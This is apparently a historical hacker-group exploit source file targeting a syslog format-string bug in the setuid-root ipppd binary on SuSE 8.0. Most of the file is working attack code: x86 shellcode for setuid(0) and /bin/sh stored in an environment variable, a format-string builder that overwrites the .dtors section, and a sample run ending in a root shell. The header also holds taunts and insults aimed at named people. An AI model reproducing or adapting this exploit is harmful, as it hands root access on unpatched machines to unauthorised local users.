/*
 * GOBBLES-own-ipppd.c -- local root on SuSE 8.0
 *
 * Random Defcon Quote:
 *  "Who hired Gary Coleman to play KF at defcon?"
 *   -Anonymous
 *
 * ipppd is part of the isdn4linux-utils package and
 * is part of the default install of many linux dists.
 *
 * It is installed suid root on suse 8.0 but can only
 * be run by users in group "dialout". Luckily this
 * is a default group that normal users get added to.
 *
 * Problem:
 *
 * Classical syslog(3) formatstring problem.
 *
 * ipppd will log device strings in the following manner:
 *
 * main.c:
 *
 * ...
 * syslog(LOG_NOTICE,devstr);  // HARD TO SPOT BUG
 * ...
 *
 * This code is normally only reached with a valid device string
 * but if you feed ipppd a devicename that is >= 256 bytes it
 * will merrily proceed to log this string using the faulty
 * syslog(3) call. Subsequently handing over root access to the machine.
 *
 *     GENERIC FORMATSTRING EXPLOITS ARE SUPER DUPER FUN
 *
 * We're surprised that format bugs are allowed in 7350linux, but no one
 * is perfect.  Finding format bugs is a difficult task, and should be left
 * to the professionals.  A little known fact -- Paul Vixie invented
 * insecure programming.  We wanted to get this bug squashed before some
 * "researcher" from snosoft.com discovered it and tried to make some money
 * off it.  Help us in our mission to eliminate the existance of format bugs
 * in code.
 *
 * Greets:
 *  -Mark Litchfield, for helping make defcon happen.  Thanks.
 *  -Blue Boar, for his brilliant input during the Defcon Ethics Roundtable
 *   Challenge (the finest moment of defcon X)
 *  -Dean Turner, who contrary to whatever might be said, GOBBLES is not
 *   afraid of.  http://www.infonexus.com/PIX/08.01.02--defcon10/46.jpg
 *  -Eric Hines of f8labs.com, congradulations on your promotion to stockboy
 *   at Circuit City.
 *  -dice, for continuing to support the blackhat world (thanks for buying
 *   a turkey breakfast)
 *  -stealth, for making fun of the super bug.
 *  -Brian McWilliams, for thinking he knows what's up.  Hoser.
 *
 * Be careful using the Compaq TestDrive Servers -- researchers from SnoSoft
 * have comprimised each and every one of those machines, and are rapidly
 * stealing other warez developed on these machines.  If you have also
 * worked with your perl -e techniques on these machines, and discovered some
 * locally exploitable stack overflows, your work may have been ripped off.
 * KF, the defcon stage, much like information security, is not for you.
 *
 * Please, help liberate dvdman!  Let him go back to maintaining
 * l33tsecurity.com, and stop raping his mind for less-than-minimum wage;
 * skill displayed on l33tsecurity.com shows this man knows what's up and
 * deserves to make a little more money, or return to the wild where he
 * can hack freely.  FREE DVDMAN!@#!@#
 *
 * (flashn has asked that the "hack.se is a bunch of nazis" statement from
 *  the defcon speech to be publically retracted and for an apology to be
 *  issued)
 *
 */
/*
 * PROOF OF CONCEPT ON DEFAULT SuSE 8.0 INSTALL:
 *
 * $ ./GOBBLES-own-ipppd -t 0x806c864
 * [*] target @ 0x806c868
 * [*] shellcode @ 0xbfffffb5
 * sh-2.05# id
 * uid=0(root) gid=100(users) groups=100(users)
 * sh-2.05#
 *
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#define DPA             11
#define ALLIGN          3

#define IPPPD           "/usr/sbin/ipppd"
#define OBJDUMP         "/usr/bin/objdump"

void buildstring(unsigned long t, unsigned long w, int dpa, int allign);
void stuff(void);

extern char **environ;
char string[260];

int
main(int argc, char **argv)
{
        int dpa, aln, shift = 0;
        char opt, *tmp;
        unsigned long t, w;

        if(argc == 1) {
                fprintf(stderr, "\nUsage: \n%s -t <.dtors address>\n\n"
                                "Optional:\n\t-o <word offset>\n\t-a <allignment>\n\n"
                                "For the lazy:\n\t-g spits out .dtors section (use standalone)\n\n"
                                , argv[0]);
                exit(0);
        }

        aln = ALLIGN;
        dpa = DPA;

        while((opt = getopt(argc, argv, "t:o:a:g")) != EOF) {
                switch(opt) {
                        case 't':
                                sscanf(optarg, "%p", &tmp);
                                t = (long)tmp;
                                t += 4;
                                break;
                        case 'a':
                                aln = atoi(optarg);
                                break;
                        case 'o':
                                dpa = atoi(optarg);
                                break;
                        case 'g':
                                fprintf(stderr, "[*] requested objdump, this will halt any exploitation\n");
                                if(execl(OBJDUMP, "objdump", "-s", "-j", ".dtors", IPPPD, NULL)) {
                                        fprintf(stderr, "[*] error getting .dtors section, check paths\n");
                                        exit(1);
                                }
                        default:
                                fprintf(stderr, "hehehe ;PppPPPpP\n");
                                exit(0);
                }
        }

        tmp = NULL;

        if((tmp = getenv("GOBBLES")) == NULL) {
                stuff();
                if(execve(argv[0], argv, environ)) {
                        fprintf(stderr, "[*] error re-executing\n");
                        exit(1);
                }
        }

        w = (long)tmp;
        shift = (strlen(argv[0]) - strlen(IPPPD));
        w += shift;

        fprintf(stderr, "[*] target @ %p\n[*] shellcode @ %p\n", t, w);

        buildstring(t, w, dpa, aln);

        if(execl(IPPPD, "ipppd", string, NULL)) {
                fprintf(stderr, "[*] error executing\n");
                exit(1);
        }
}


void
buildstring(unsigned long t, unsigned long w, int dpa, int aln)
{
        char a_buf[4];
        unsigned int un, deux, x, len, b[4];

        memset(string, '\0', sizeof(string));
        memset(a_buf, '\0', sizeof(a_buf));

        for(x = 0; x < aln && x < sizeof(a_buf); x++)
                a_buf[x] = 'x';

        b[0] = (t & 0x000000ff);
        b[1] = (t & 0x0000ff00) >> 8;
        b[2] = (t & 0x00ff0000) >> 16;
        b[3] = (t & 0xff000000) >> 24;

        un = (w >> 16) & 0xffff;
        deux = w & 0xffff;

        if(un < deux) {
                snprintf(string, sizeof(string)-1,
                        "%s"
                        "%c%c%c%c%c%c%c%c"
                        "%%.%hdx" "%%%d$hn"
                        "%%.%hdx" "%%%d$hn",
                        a_buf,
                        b[0] + 2, b[1], b[2], b[3], b[0], b[1], b[2], b[3],
                        un - (8 + aln + 5), dpa,
                        deux - un, dpa + 1
                );
        }
        else {
                snprintf(string, sizeof(string)-1,
                        "%s"
                        "%c%c%c%c%c%c%c%c"
                        "%%.%hdx" "%%%d$hn"
                        "%%.%hdx" "%%%d$hn",
                        a_buf,
                        b[0], b[1], b[2], b[3], b[0]+2, b[1], b[2], b[3],
                        deux - (8 + aln + 5), dpa,
                        un - deux, dpa + 1
                );
        }

        len = strlen(string);
        memset(&string[len], 'x', (sizeof(string)-len-1));
}


void
stuff(void)
{
        char code[] = // the setuid 0 with the execve of the /bin/sh
        "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31"
        "\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d"
        "\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff"
        "\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58";  // In honor of Snosoft
                                                 // appreciate week, we
                                                 // too are using only
                                                 // Taeho Oh shellcode.
        setenv("GOBBLES", code, 1);
}
